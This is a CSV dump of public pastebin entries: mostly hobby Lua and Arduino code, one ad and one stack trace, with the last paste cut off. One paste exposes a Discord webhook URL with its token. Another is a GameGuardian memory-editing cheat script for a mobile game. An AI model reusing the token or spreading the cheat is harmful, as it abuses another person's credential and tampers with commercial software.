@@ -1,0 +1,5046 @@
+id,title,username,language,date,content
+Qzn8eepx,Gate control Draconic Core,Revector,Lua,Monday 9th of June 2025 12:52:20 AM CDT,"local config = {
+    -- maxCoreEnergy - на этом уровне будет поддерживаться количество энергии в ядре
+    -- 1000 * 10^9 соответсвунт 1000 B или 1 T
+    maxCoreEnergy = 1000 * 10^9,
+    maxDiffEnergy = 10000, -- максимальная скорость накапливания энергии Rf/t, тестировалось на этом значении
+    step = 5000,  -- шаг изменния значения на гейте
+
+    sleepTime = 1, -- шаг замеров в сек
+}
+
+local com = require('component')
+local gpu = com.gpu
+gpu.setResolution(80, 25) -- lvl 2
+
+local function coreEnergy()
+    return com.draconic_rf_storage.getEnergyStored()
+end
+
+local function format(num)
+    if num > 10^12 then
+        return string.format(""%0.3f T"", num/10^12)
+    elseif num > 10^9 then
+        return string.format(""%0.3f B"", num/10^9)
+    elseif num > 10^6 then
+        return string.format(""%0.3f M"", num/10^6)
+    elseif num > 10^3 then
+        return string.format(""%0.3f K"", num/10^3)
+    else
+        return string.format(""%d"", num)
+    end
+end
+
+local filVal = 0
+function expRunningAvg(newVal)
+    filVal = filVal + ((newVal-filVal) * 0.3)
+    return filVal
+end
+
+if false == com.isAvailable(""draconic_rf_storage"") then
+    print(""Rf storage not connected!"")
+    os.exit()
+end
+
+if false == com.isAvailable(""flux_gate"") then
+    print(""Flux gate not connected!"")
+    os.exit()
+end
+
+local time = os.time()
+local energy = coreEnergy()
+
+local w, h = gpu.getResolution()
+function asbMax(t)
+    local  max = t[1]
+    for _, val in ipairs(t) do
+        if math.abs(val) > max then
+            max = math.abs(val)
+        end
+    end
+
+    return max
+end
+
+local _MID = h/2 + 3
+local _NUM_READ = w
+local energyLog = {}
+local current = 0
+
+function displayGraph(diff)
+    current = current + 1
+    if current > _NUM_READ then
+        current = 1
+    end
+
+    energyLog[current] = diff
+
+    local maxVal = asbMax(energyLog)
+
+    gpu.fill(1, _MID, w, 1, '━')
+    local row = 1
+    for i = current, _NUM_READ + current - 1 do
+        local key = i % w + 1
+
+        if energyLog[key] then
+            local d = (math.ceil(energyLog[key] / (maxVal * 0.1)))
+            if d > 0 then
+                gpu.fill(row, _MID-d, 1, d, '█')
+            else
+                gpu.fill(row, _MID+1, 1, math.abs(d), '█')
+            end
+        end
+
+        row = row + 1
+    end
+end
+
+function displayData(core, diff, action, fluxGateFlow)
+    gpu.fill(1, 1, w, h, "" "")
+    gpu.set(2, 1, string.format("" Энергии в ядре: %s [%0.0f Rf]"", format(core), core))
+    gpu.set(2, 2, string.format("" Выход на гейте: %s Rf [%0.0f Rf]  %s"", format(fluxGateFlow), fluxGateFlow, action))
+    gpu.set(2, 3, string.format(' Накопление энергии: %0.1f Rf/t', diff))
+
+    displayGraph(diff)
+end
+
+local running = true
+while running do
+    os.sleep(config.sleepTime)
+
+    local tmpEnergy = coreEnergy()
+    local tmpTime = os.time()
+
+    local energyDiff = tmpEnergy - energy
+    local timeDiff = tmpTime - time
+
+    local diff = expRunningAvg(energyDiff / timeDiff)
+
+    local fluxGateFlow = com.flux_gate.getFlow();
+
+    local action = """"
+
+    if tmpEnergy > config.maxCoreEnergy then
+        if diff > (config.maxDiffEnergy * -1) then
+            action = 'Повышаю ▲'
+            com.flux_gate.setSignalLowFlow(fluxGateFlow + config.step)
+        end
+    else
+        if diff < config.maxDiffEnergy then
+            action = 'Понижаю ▼'
+            com.flux_gate.setSignalLowFlow(fluxGateFlow - config.step)
+        end
+    end
+
+    displayData(tmpEnergy, diff, action, fluxGateFlow)
+
+    time = tmpTime
+    energy = tmpEnergy
+end
+"
+dXArsMfR,**Fall Detection** rev_01,pleasedontcode,Arduino,Monday 9th of June 2025 12:38:03 AM CDT,"/********* Pleasedontcode.com **********
+
+	Pleasedontcode thanks you for automatic code generation! Enjoy your code!
+
+	- Terms and Conditions:
+	You have a non-exclusive, revocable, worldwide, royalty-free license
+	for personal and commercial use. Attribution is optional; modifications
+	are allowed, but you're responsible for code maintenance. We're not
+	liable for any loss or damage. For full terms,
+	please visit pleasedontcode.com/termsandconditions.
+
+	- Project: **Fall Detection**
+	- Source Code NOT compiled for: Arduino Uno
+	- Source Code created on: 2025-06-09 05:34:17
+
+********* Pleasedontcode.com **********/
+
+/****** SYSTEM REQUIREMENTS *****/
+/****** SYSTEM REQUIREMENT 1 *****/
+	/* it wont reset after i pressed cancellation button */
+/****** END SYSTEM REQUIREMENTS *****/
+
+/* START CODE */
+
+/****** DEFINITION OF LIBRARIES *****/
+#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton
+#include ""TinyGPS.h"" // Include TinyGPS library
+#include ""SoftwareSerial.h"" // Include SoftwareSerial library
+
+/****** FUNCTION PROTOTYPES *****/
+void setup(void);
+void loop(void);
+
+/***** DEFINITION OF DIGITAL INPUT PINS *****/
+const uint8_t cancellationbutton_PushButton_PIN_D2		= 2;
+#define buttonPin 8 // Confirmation button
+#define cancelButtonPin 7 // Cancellation button
+
+/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
+const uint8_t myLED_LED_PIN_D3		= 3;
+#define buzzerPin 6 // Buzzer pin
+#define ledPin 5 // LED pin
+
+/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
+/***** used to store raw data *****/
+bool	myLED_LED_PIN_D3_rawData		= 0;
+
+/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
+/***** used to store data after characteristic curve transformation *****/
+float	myLED_LED_PIN_D3_phyData		= 0.0;
+
+/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
+SoftwareSerial GPRS(2,3); // RX=pin 2, TX=pin 3
+SoftwareSerial serial_connection(10, 11); // RX=pin 10, TX=pin 11
+TinyGPSPlus gps; // This is the GPS object that will work with the NMEA data
+
+// Pins and variables declarations
+float latitude=0; 
+float longitude=0;                       
+String Speed="""";
+int Contrast=20;
+
+// Accelerometer pins
+#define x A1
+#define y A2
+#define z A3
+
+// Pulse Sensor pin
+#define pulseSensorPin A0 
+
+// Variables corresponding to accelerometer
+int xsample=0;
+int ysample=0;
+int zsample=0;
+
+#define samples 10 // number of sample readings in still case
+#define fallThreshold 650 // Fall Detection Threshold
+
+// Threshold maximum and minimum values of change in acceleration when fall is detected
+#define minVal -50
+#define MaxVal 50
+
+// Variables tracking button state
+bool isFallDetected = false;
+bool isFallConfirmed = false;
+bool isFallCancelled = false;
+
+// Assign timing
+unsigned long fallTime; // when fall is detected
+unsigned long confirmationTimeout = 5000; // Time wait for confirmation or cancellation button is 5 seconds
+unsigned long confirmationWaitTime; // Time to wait for confirmation
+
+// Pulse sensor variables
+int pulseValue = 0;
+unsigned long lastBeatTime = 0; // Last time heartbeat detected
+unsigned long beatInterval = 0; // Time interval between beats
+int heartRate = 0; // heart rate in BPM
+int pulseThreshold = 512; // default threshold for pulse
+
+// Function declarations
+void triggerFallConfirmation(); 
+void sendAlert(); 
+void resetPotentiometer(); 
+
+void setup(void)
+{
+	// put your setup code here, to run once:
+	Serial.begin(9600); // Start serial communication
+	serial_connection.begin(9600); // This opens up communications to the GPS
+	Serial.println(""successfully Initialized...."");
+	Serial.println(""GPS Start""); // Just show to the monitor that the sketch has started
+	
+	// Taking samples in still case
+	for(int i=0; i<samples; i++)  
+	{    
+		xsample += analogRead(x);    
+		ysample += analogRead(y);    
+		zsample += analogRead(z);  
+	}    
+
+	// Taking average
+	xsample /= samples;  
+	ysample /= samples;  
+	zsample /= samples;  
+	Serial.println(xsample);  
+	Serial.println(ysample);  
+	Serial.println(zsample);  
+	delay(1000);  
+
+	// Set pin mode for button, buzzer and led  
+	pinMode(cancellationbutton_PushButton_PIN_D2, INPUT_PULLUP);
+	pinMode(buttonPin, INPUT_PULLUP); // Confirmation button  
+	pinMode(cancelButtonPin, INPUT_PULLUP); // Cancellation button  
+	pinMode(buzzerPin, OUTPUT); // Buzzer pin  
+	pinMode(ledPin, OUTPUT); // LED pin  
+	pinMode(pulseSensorPin, INPUT); // Pulse sensor pin  
+}
+
+void loop(void)
+{
+	// put your main code here, to run repeatedly:
+	updateOutputs(); // Refresh output data
+	
+	while(serial_connection.available()) // While there are characters to come from the GPS  
+	{    
+		gps.encode(serial_connection.read()); // This feeds the serial NMEA data into the library one char at a time      
+	}  
+	if(gps.location.isUpdated())  
+	{    
+		// Get the latest info from the gps object which it derived from the data sent by the GPS unit    
+		Serial.println(""Satellite Count : "");    
+		Serial.println(gps.satellites.value());    
+		Serial.println(""Latitude : "");    
+		Serial.println(gps.location.lat(), 6);    
+		Serial.println(""Longitude : "");    
+		Serial.println(gps.location.lng(), 6);    
+		Serial.println(""Speed MPH : "");    
+		Serial.println(gps.speed.mph());    
+		Serial.println(""Altitude Feet : "");    
+		Serial.println(gps.altitude.feet());    
+		Serial.println("""");  
+	}  
+
+	int value1 = analogRead(x);    
+	int value2 = analogRead(y);    
+	int value3 = analogRead(z);    
+	int xValue = xsample - value1;    
+	int yValue = ysample - value2;    
+	int zValue = zsample - value3;        
+
+	Serial.print(""x="");    
+	Serial.println(xValue);    
+	Serial.print(""y="");    
+	Serial.println(yValue);    
+	Serial.print(""z="");    
+	Serial.println(zValue);    
+
+	// Pulse sensor reading    
+	pulseValue = analogRead(pulseSensorPin); // Read value from x axis potentiometer    
+	pulseThreshold = map(analogRead(x), 0, 1023, 400, 600); // Adjust threshold range (400-600)    
+	Serial.print(""Pulse Value : "");    
+	Serial.println(pulseValue);    
+	Serial.print(""Pulse Threshold : "");    
+	Serial.println(pulseThreshold);    
+
+	if(pulseValue > pulseThreshold)    
+	{      
+		if(millis() - lastBeatTime > 500) // Only count a beat every 500ms (roughly 60BPM)        
+		{        
+			heartRate = 60000 / (millis() - lastBeatTime); // Calculate heart rate in beats per minute        
+			lastBeatTime = millis();        
+			Serial.print(""Heart Rate : "");        
+			Serial.println(heartRate);        
+			// Check if heart rate is abnormal        
+			if(heartRate < MIN_HEART_RATE || heartRate > MAX_HEART_RATE)        
+			{          
+				Serial.println(""Abnormal heart rate detected. Please confirm if fall has occured."");          
+				triggerFallConfirmation(); // Confirm whether there's a fall or not        
+			}              
+		}    
+	}  
+
+	// Condition for Fall Detection    
+	if(xValue < minVal || xValue > MaxVal || yValue < minVal || yValue > MaxVal || zValue < minVal || zValue > MaxVal)    
+	{ // Fall Detected, send SMS to emergency contact        
+		Serial.println(""Fall Detected, Please press the button to confirm..."");        
+		isFallDetected = true; // When fall is detected                
+		
+		// Buzzer and LED on when fall is detected        
+		digitalWrite(buzzerPin, HIGH); // Buzzer On        
+		digitalWrite(ledPin, HIGH); // LED on        
+		fallTime = millis(); // Record time when fall is detected        
+		confirmationWaitTime = fallTime + confirmationTimeout; // Set timeout time for confirmation        
+
+		// Confirmation button        
+		while (!isFallConfirmed && !isFallCancelled && millis() < confirmationWaitTime)        
+		{          
+			// Wait for confirmation or cancellation button press          
+			if (digitalRead(buttonPin) == LOW) // If confirmation button is pressed            
+			{            
+				isFallConfirmed = true;            
+				Serial.println(""Fall is confirmed!"");            
+				sendAlert(); // Send SMS alert            
+				break; // Exit loop once fall is confirmed          
+			}          
+			if (digitalRead(cancelButtonPin) == LOW)            
+			{            
+				isFallCancelled = true; // If cancellation button is pressed            
+				Serial.println(""Fall Detection cancelled"");            
+				// Do not reset the state after cancellation
+				digitalWrite(buzzerPin, LOW); // Buzzer off            
+				digitalWrite(ledPin, LOW); // LED off            
+				break;          
+			}                  
+		}        
+
+		// If no confirmation or cancellation button is pressed, automatically confirm the fall        
+		if(!isFallConfirmed && millis() >= confirmationWaitTime) 
+		{          
+			isFallConfirmed = true;          
+			Serial.println(""No response, fall Detection is confirmed"");          
+			sendAlert(); // send SMS automatically        
+		}        
+
+		// After confirmation or cancellation, reset fall detection        
+		if (isFallCancelled)        
+		{          
+			resetPotentiometer(); // Reset Potentiometer values after confirmation          
+			isFallDetected = false;          
+			isFallConfirmed = false;          
+			// Do not reset isFallCancelled to allow for further cancellations
+			Serial.println(""Fall Detection reset."");          
+			// Reset after cancellation and continue monitoring          
+			digitalWrite(buzzerPin, LOW); // Buzzer off          
+			digitalWrite(ledPin, LOW); // LED off        
+		}        
+	}      
+	delay(1000);
+}
+
+void updateOutputs()
+{
+	digitalWrite(myLED_LED_PIN_D3, myLED_LED_PIN_D3_rawData);
+}
+
+// Send SMS alert
+void sendAlert() 
+{   
+	// Initialize GPRS module        
+	GPRS.begin(9600);        
+	Serial.println(""Connecting to network..."");        
+	delay(2000); // wait for network connection        
+	Serial.println(""Should be connected to network by now"");        
+	
+	// Send SMS alerts with location        
+	GPRS.print(""AT+CMGF=1\r""); // set SMS format to text mode        
+	delay(1200);         
+	GPRS.print(""AT+CMGS=\""+01xxxxxxxxx\""\r""); // Set phone number to send alert with (replace with actual number)
+	delay(1200);                 
+	
+	// Message        
+	GPRS.print(""Fall Detected!"");        
+	GPRS.print(""Location:\n"");        
+	GPRS.print(""Latitude : "");        
+	GPRS.print(latitude);        
+	GPRS.print(""\nLongitude : "");        
+	GPRS.print(""\nGoogle Maps Link: http://maps.google.com/maps?&z=15&mrt=yp&t=k&q="");        
+	GPRS.println(latitude);        
+	GPRS.println(""+"");        
+	GPRS.println(longitude);        
+	GPRS.write(26); // Send SMS         
+	GPRS.println(""SMS Sent!"");      
+}
+
+// Function resetting potentiometer
+void resetPotentiometer() 
+{  
+	xsample = 0;  
+	ysample = 0;  
+	zsample = 0;  
+	for(int i = 0; i < samples; i++) 
+	{    
+		xsample += analogRead(x);    
+		ysample += analogRead(y);    
+		zsample += analogRead(z);  
+	}  
+	// Average after reset  
+	xsample /= samples;  
+	ysample /= samples;  
+	zsample /= samples;  
+	Serial.println(""Potentiometer reset values: "");  
+	Serial.println(xsample);  
+	Serial.println(ysample);  
+	Serial.println(zsample);
+}
+
+// Trigger fall confirmation based on abnormal heart rate
+void triggerFallConfirmation() 
+{  
+	Serial.println(""Please press the confirmation button if fall has occured."");
+}
+
+/* END CODE */"
+nHYTcAxX,Calculator,Rukerisu,Lua,Monday 9th of June 2025 12:36:51 AM CDT,"-- Calculator
+
+local options = {
+    ""Addition"",
+    ""Subtraction"",
+    ""Multiplication"",
+    ""Division"",
+    ""Exit""
+}
+
+-- Draw menu with current selection highlighted
+local function drawMenu(selected)
+    term.clear()
+    term.setCursorPos(1,1)
+    print(""=== Calculator ==="")
+    print(""Use UP/DOWN arrows to navigate, ENTER to select.\n"")
+
+    for i, option in ipairs(options) do
+        if i == selected then
+            term.setTextColor(colors.yellow)
+            print(""> "" .. option)
+            term.setTextColor(colors.white)
+        else
+            print(""  "" .. option)
+        end
+    end
+end
+
+local function readNumber(prompt)
+    while true do
+        write(prompt)
+        local input = read()
+        local num = tonumber(input)
+        if num then
+            return num
+        else
+            print(""Invalid input, please enter a number."")
+        end
+    end
+end
+
+local function calculator()
+    local selected = 1
+    drawMenu(selected)
+
+    while true do
+        local event, key = os.pullEvent(""key"")
+        if key == keys.up then
+            selected = selected - 1
+            if selected < 1 then selected = #options end
+            drawMenu(selected)
+        elseif key == keys.down then
+            selected = selected + 1
+            if selected > #options then selected = 1 end
+            drawMenu(selected)
+        elseif key == keys.enter then
+            if options[selected] == ""Exit"" then
+                term.clear()
+                print(""Goodbye!"")
+                break
+            else
+                -- Ask for numbers and calculate
+                local a = readNumber(""Enter first number: "")
+                local b = readNumber(""Enter second number: "")
+                local result
+
+                if options[selected] == ""Addition"" then
+                    result = a + b
+                    print(string.format(""Result: %.2f + %.2f = %.2f"", a, b, result))
+                elseif options[selected] == ""Subtraction"" then
+                    result = a - b
+                    print(string.format(""Result: %.2f - %.2f = %.2f"", a, b, result))
+                elseif options[selected] == ""Multiplication"" then
+                    result = a * b
+                    print(string.format(""Result: %.2f * %.2f = %.2f"", a, b, result))
+                elseif options[selected] == ""Division"" then
+                    if b == 0 then
+                        print(""Error: Division by zero is not allowed."")
+                    else
+                        result = a / b
+                        print(string.format(""Result: %.2f / %.2f = %.2f"", a, b, result))
+                    end
+                end
+
+                print(""\nPress any key to return to menu..."")
+                os.pullEvent(""key"")
+                drawMenu(selected)
+            end
+        end
+    end
+end
+
+calculator()"
+tnaVLGZ5,"Compassionate and Effective Vein Treatment in West Hollywood, CA",usveinclinics,HTML,Monday 9th of June 2025 12:30:21 AM CDT,"USA Vein Clinics in West Hollywood provides expert care for varicose veins, spider veins, and other vein conditions using advanced, minimally invasive treatments. Our experienced vein specialists offer FDA-approved procedures such as Endovenous Laser Therapy (EVLT), Radiofrequency Ablation (RFA), and Sclerotherapy to help relieve leg pain, swelling, and discomfort. At Vein center in West Hollywood, our clinic offers compassionate, effective vein care in a modern, comfortable setting. Trust our skilled team to help you feel better and regain your confidence.
+https://www.usaveinclinics.com/company/locations/california/office/west-hollywood/"
+5pn0fjMG,add close button on Mobile Sticky Ads,arie_cristianD,PHP,Sunday 8th of June 2025 09:49:05 PM CDT,"
+function add_close_button_to_ads() {
+	?>
+	<script>
+		/* Add Close Button for  Mobile Sticky Ads */
+		(function ($) {
+			$(window).ready(function () {
+				var container = $('.jnews_mobile_sticky_ads'),
+				wrapper = container.find('.ads-wrapper');
+				wrapper.html(wrapper.html() + '<span id=""close"">X</span>');
+				wrapper.find('#close').click(function (e) {
+					e.preventDefault();
+					$(this).parent().parent().remove();
+				});
+			});
+		})(jQuery);
+	</script>
+	<?php
+}
+add_action( 'wp_footer', 'add_close_button_to_ads' );"
+gCVsnf1r,oijhgfdsa,MoneyLiza,Java,Sunday 8th of June 2025 09:40:07 PM CDT,https://discord.com/api/webhooks/1381470322527834186/EuPFhvX5CDeyqvqnandQjLWvqv_HdQPGSIYD_--mKEtFGbitbarPLHEr1i1WzLndR8X8
+t1w0m1An,2025-06-09T04:39:08.882157,powerampache,PHP,Sunday 8th of June 2025 09:39:07 PM CDT,"1.00-70 (70) - DB: 83
+java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
+	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
+	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
+	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
+	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
+	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
+	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
+	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
+	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
+	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
+	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)
+
+"
+zLHhSgbc,Adonis Bypass 2,Steamhesaproblox,RBScript,Sunday 8th of June 2025 09:25:18 PM CDT,
+2TX9kwYv,Quary,ChicagoFire3,Lua,Sunday 8th of June 2025 08:27:29 PM CDT,"require ""GenUtil""
+
+local straight = 0
+local depth = 0
+local right = 0
+
+local x2 = straight-1
+local y2 = depth
+local z2 = right
+
+function CheckDig()
+  local count = turtle.getItemCount(16)
+  if count > 0 then
+    turtle.select(1)
+    turtle.placeUp()
+    EmptyUp(1)
+  end
+end
+
+local GoRight = true;
+local Reverse = true;
+
+while y2 > 0 do
+  y2 = y2-1
+  turtle.digDown()
+  turtle.down()
+
+  while z2 > 0 do
+    z2 = z2-1
+    while x2 > 0 do
+      x2 = x2-1
+      CheckDig()
+      turtle.dig()
+      turtle.forward()
+    end
+    x2 = straight-1
+    if not (z2 == 0) then
+      if GoRight then
+        turtle.turnRight()
+        turtle.dig()
+        turtle.forward()
+        turtle.turnRight()
+        GoRight = not GoRight
+      else
+        turtle.turnLeft()
+        turtle.dig()
+        turtle.forward()
+        turtle.turnLeft()
+        GoRight = not GoRight
+      end
+    end
+  end
+  turtle.turnRight()
+  turtle.turnRight()
+  z2 = right
+end"
+fRJMiqF6,Souls Seeker,pastebinserver2021,Lua,Sunday 8th of June 2025 07:55:03 PM CDT,"active = 1
+gg.setVisible(false) 
+gg.getResults(gg.getResultsCount())
+gg.clearResults()
+v = gg.getTargetInfo()
+if v.x64 then
+gg.getRanges() 
+gg.setRanges(gg.REGION_ANONYMOUS) 
+else
+gg.alert(""Script Works Only On 64 Game\nDownload 64 Bit Mk Mobile and Try Again"")
+os.exit()
+end
+-------------------------------------------------------------------------
+if v.processName ~= ""com.wb.goog.mkx""then
+  gg.alert(""This Script is not for\n\n"".. v.processName .. ""\n"".. v.label .. ""\n\nPlease Select the Correct Game:\nMortal Kombat"", (""EXIT""))
+  gg.getResults(gg.getResultsCount())
+  gg.clearResults()
+  gg.toast(""Good-bye  ;-)"") 
+  print(""KKBS4U SCRIPTS\nGOOD BYE :-)"")
+  os.exit()
+  end
+-------------------------------------------------------------------------
+if v.versionName ~= ""6.2.0""then 
+gg.getResults(gg.getResultsCount())
+gg.clearResults()  
+gg.alert(""This Script is Only for:\nMortal Kombat v 6.1.0"", ""GOODBYE"", nil, (""EXIT""))
+gg.toast(""Good-bye  ;-)"") 
+gg.setVisible(true) 
+print(""KKBS4U SCRIPTS\nGood Bye"")
+os.exit()
+end  
+-------------------------------------------------------------------------
+gg.toast(""KKBS4U SCRIPTS"")
+gg.alert(""••WELCOME••\nxMKM Battle Mode Farming Script By KKBS4U SCRIPTS\n\nUnlimited Souls\nUnlimited Coins\nUnlimited Rare Equipments"",""ENTER"",nil,""KKBS4U SCRIPTS"")
+
+
+function menu()
+if AB==1 then ab=""[√]"" else ab=""[  ]"" end 
+if AC==1 then ac=""[√]"" else ac=""[  ]"" end 
+if AD==1 then ad=""[√]"" else ad=""[  ]"" end 
+active = 0
+multi = gg.multiChoice({
+ab..'Setup Final Battle', 
+ac..'Remove Cassie & Fatality', 
+ad..'Weak Kitana Boss',
+'Exit'},nil,""xMK VIP KKBS4U SCRIPTS\nSOULS, COINS, RARE EQUIP"")
+if multi == nil then return end
+if multi[1] == true then ch1() end
+if multi[2] == true then ch2() end
+if multi[3] == true then ch3() end
+if multi[4] == true then exit() end
+if multi == nil then return end
+end
+
+
+
+function ch1()
+if AB == 1 then 
+gg.alert(""You Already Used this Hack Go Back and check final battle[✓]"")
+menu() return
+end
+wait()
+x=""148600100~148900100"" t=d search() visible() 
+o=-3336 offset()  x=""148600100~148900100"" refine()
+o=8 offset() x=""148600100~148900100"" refine()
+o=288 offset() x=""17~21""refine()
+o=4 offset() x=0 edit() freeze()
+o=4 offset() x=6 edit() freeze()
+o=4 offset() x=6 edit() freeze()
+o=4 offset() x=9 edit() freeze()
+o=4 offset() x=6 edit() freeze()
+o=4 offset() x=6 edit() freeze()
+o=4 offset() x=9 edit() freeze()
+o=4 offset() x=0 edit() freeze()
+o=4 offset() x=256 edit() freeze()
+clear()
+gg.toast(""Final Battle Set"")
+AB = 1
+return end
+
+
+
+function ch2()
+if AC == 1 then 
+gg.alert(""You Already Used this Hack Go Back and check\nFatality and Cassie Removed[✓]"")
+menu() return
+end
+wait()
+x=""50;50;1;1;1;0:21"" t=d search() visible() 
+x=50 refine() gg.searchPointer(0x12)
+o=8 offset() x=1 refine() 
+o=4 offset() x=1 refine()
+o=52 offset() x=0 edit()
+o=4 offset() x=0 edit()
+o=-176 offset()  x=0 edit()
+o=-4 offset() x=0 edit()
+gg.searchPointer(0x1024)
+o=-8 offset() x=0 edit()
+clear()
+gg.toast(""Fatality + Energy"")
+AC = 1
+return end
+
+
+function ch3()
+if AD == 1 then 
+gg.alert(""You Already Used this Hack Go Back and Kitana boss already weak[✓]"")
+menu() return
+end
+wait()
+x=3000 t=d search() visible() 
+o=4 offset() x=150 refine() x=1 edit()
+o=4 offset() x=2000 refine() x=1 edit()
+o=4 offset() x=1100 refine() x=1 edit()
+o=-12 offset() x=3000 refine() x=1 edit()
+clear()
+gg.toast(""Kitana Weak Done"")
+AD = 1
+return end
+
+--××××××××××××××××××××××××××××××××××××××××××
+--××××××××××××××××××××××××××××××××××××××××××
+d = gg.TYPE_DWORD  
+e = gg.TYPE_DOUBLE
+f = gg.TYPE_FLOAT
+
+function offset()
+gg.getResults(gg.getResultsCount())
+local results = gg.getResults(gg.getResultsCount())     
+for i, p in ipairs(results) do
+results[i].address = results[i].address + o
+results[i].flags = t
+end  
+gg.loadResults(results)
+gg.getResults(gg.getResultsCount())
+end 
+
+function clear()
+gg.getResults(gg.getResultsCount())
+gg.clearResults()
+end 
+
+function clearall() 
+gg.getResults(gg.getResultsCount())
+gg.clearResults()
+gg.getListItems()
+gg.clearList()
+end 
+
+function freeze()
+gg.getResults(gg.getResultsCount())
+zz = gg.getResults(gg.getResultsCount())
+for i, v in ipairs(zz) do
+v.freeze = true
+end
+gg.addListItems(zz)
+gg.getResults(gg.getResultsCount()) 
+end 
+
+function unfreeze()
+gg.getResults(gg.getResultsCount())
+zz = gg.getResults(gg.getResultsCount())
+for i, v in ipairs(zz) do
+v.freeze = false
+end
+gg.addListItems(zz)
+gg.getResults(gg.getResultsCount()) 
+end 
+
+function search()
+gg.getResults(gg.getResultsCount())
+gg.clearResults()
+gg.searchNumber(x,t) 
+end 
+
+function refine()
+gg.refineNumber(x,t) 
+end 
+
+function refinenot()
+gg.refineNumber(x,t,false,gg.SIGN_NOT_EQUAL) 
+end 
+
+function edit()
+gg.getResults(gg.getResultsCount())
+gg.editAll(x,t) 
+end 
+
+function get()
+gg.getResults(gg.getResultsCount())
+end 
+
+function head()
+gg.getResults(gg.getResultsCount())
+gg.getResults(1)
+local header = gg.getResults(1)
+gg.clearResults()
+gg.searchNumber(tostring(header[1].value),gg.TYPE_DWORD) 
+gg.getResults(gg.getResultsCount())
+end 
+
+function heads()
+gg.getResults(gg.getResultsCount())
+gg.clearResults()
+gg.searchNumber(tostring(header[1].value),gg.TYPE_DWORD) 
+gg.getResults(gg.getResultsCount())
+end 
+
+function wait()
+gg.toast(""Please Wait.. "") 
+end 
+
+function check()
+gg.getResults(gg.getResultsCount())
+local check = gg.getResultsCount()
+if check == 0 then
+gg.toast(""× ERROR ×"")
+E = 0 else E = 1
+end 
+cnt = gg.getResultsCount() 
+end 
+
+function resume()
+gg.processResume()
+end
+
+
+function visible()
+if gg.isVisible() then 
+gg.setVisible(false) 
+gg.getListItems()
+gg.clearList()
+gg.getResults(gg.getResultsCount())
+gg.clearResults()
+gg.setVisible(true) 
+print(""******************\n** ACCESS DENIED **\n******************"")
+os.exit()
+end   
+end 
+
+function exit()
+clearall()
+gg.toast(""Good-bye  ;-)"")
+gg.setVisible(true) 
+print(""MKM BY KKBS4U SCRIPTS\nNO HACKING NO ENJOYMENT"")
+os.exit()
+end
+
+
+while true do
+if gg.isVisible() then
+active = 1
+gg.setVisible(false)
+gg.toast(""KKBS4U"")
+end
+if active == 1 then 
+menu() 
+end
+end "
+ybWy5BbW,Spruce2x2,ChicagoFire3,Lua,Sunday 8th of June 2025 07:48:20 PM CDT,"require ""GenUtil""
+
+function FinishLayer()
+  turtle.dig()
+  turtle.forward()
+  turtle.turnRight()
+  turtle.dig()
+  turtle.forward()
+  turtle.turnRight()
+  turtle.dig()
+  turtle.forward()
+  turtle.turnRight()
+  turtle.forward()
+  turtle.turnRight()
+end
+
+function CutLayer()
+  turtle.dig()
+  turtle.forward()
+  turtle.turnRight()
+  turtle.dig()
+  turtle.forward()
+  turtle.turnRight()
+  turtle.dig()
+end
+
+function CutSpruce()
+  turtle.dig()
+  turtle.forward()
+  FinishLayer()
+  local y = 0
+  local revert = 0
+
+  while turtle.detectUp() do
+    turtle.digUp()
+    turtle.up()
+    y = y+1
+    CutLayer()
+    revert = revert+1
+  end
+
+  if (revert % 2) == 1 then
+    turtle.forward()
+    turtle.turnRight()
+    turtle.forward()
+    turtle.turnRight()
+  end
+
+  while y > 1 do
+    turtle.down()
+    y=y-1
+  end
+
+  turtle.select(2)
+  turtle.forward()
+  turtle.placeDown()
+  turtle.turnRight()
+  turtle.forward()
+  turtle.placeDown()
+  turtle.turnRight()
+  turtle.forward()
+  turtle.placeDown()
+  turtle.turnRight()
+  turtle.forward()
+  turtle.down()
+  turtle.turnLeft()
+  turtle.forward()
+  EmptyForward(2)
+  turtle.turnRight()
+  turtle.turnRight()
+  turtle.place()
+  turtle.slect(1)
+end
+
+while true do
+  local FoundBlock, BlockType = turtle.inspect()
+  if FoundBlock then
+    if BlockType['name'] == 'minecraft:spruce_log' then
+      ReFuel(true)
+      CutSpruce()
+    end
+  end
+end"
+89Fnu4rN,OS - Menu,Rukerisu,Lua,Sunday 8th of June 2025 07:44:27 PM CDT,"-- Neobox OS Alpha Menu
+-- Simple operating system menu with navigation and file manager
+
+-- Menu configuration
+local menuItems = {
+    {name = ""Calculator"", description = ""Simple calculator"", type = ""calculator""},
+    {name = ""Programs"", description = ""Program List"", program = ""programs""},
+    {name = ""File Manager"", description = ""Browse Files"", type = ""filemanager""},
+    {name = ""Shell"", description = ""Command Line"", type = ""shell""},
+    {name = ""Reboot"", description = ""Restart"", type = ""reboot""},
+    {name = ""Shutdown"", description = ""Power Off"", type = ""shutdown""}
+}
+
+-- State variables
+local selectedIndex = 1
+local running = true
+
+-- Display functions
+local function clearScreen()
+    term.clear()
+    term.setCursorPos(1, 1)
+end
+
+local function drawHeader()
+    local w, h = term.getSize()
+    
+    -- Header
+    term.setTextColor(colors.blue)
+    local title = ""| Neobox OS Alpha |""
+    local titleX = math.floor((w - #title) / 2) + 1
+    term.setCursorPos(titleX, 2)
+    term.write(title)
+    
+    -- Subtitle
